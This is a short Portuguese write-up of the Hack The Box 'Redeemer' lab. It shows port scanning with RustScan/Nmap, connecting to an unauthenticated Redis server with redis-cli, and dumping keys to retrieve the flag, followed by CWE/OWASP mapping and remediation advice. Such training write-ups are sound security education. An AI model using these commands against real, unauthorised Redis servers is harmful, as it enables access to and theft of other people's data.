# HTB Starting Point — Redeemer

| Campo | Detalhe |
|---|---|
| SO | Linux |
| Dificuldade | Muito Fácil |
| Categoria | Serviço de banco de dados exposto sem autenticação |
| Ferramentas | RustScan, Nmap, redis-cli |

## Recon

```
rustscan -a <TARGET_IP> -- -sV -sC
```

Resultado: porta 6379/tcp aberta, identificada como serviço Redis.

## Exploração

Conexão direta ao Redis, que por padrão não exige autenticação:

```
redis-cli -h <TARGET_IP>
```

Dentro do shell interativo do Redis, enumeração das chaves armazenadas:

```
KEYS *
GET flag
```

O valor retornado pelo comando `GET` contém a flag.

## Mapeamento OWASP/CWE

- **CWE-306** (Missing Authentication for Critical Function) — Redis exposto à rede sem `requirepass` configurado
- Relacionado a **A05:2021 – Security Misconfiguration** (OWASP Top 10)

## Remediação

- Configurar `requirepass` no `redis.conf` para exigir autenticação
- Vincular o Redis apenas a interfaces internas (`bind 127.0.0.1`), nunca expor diretamente à internet
- Usar firewall/security group para restringir acesso à porta 6379 somente a hosts confiáveis
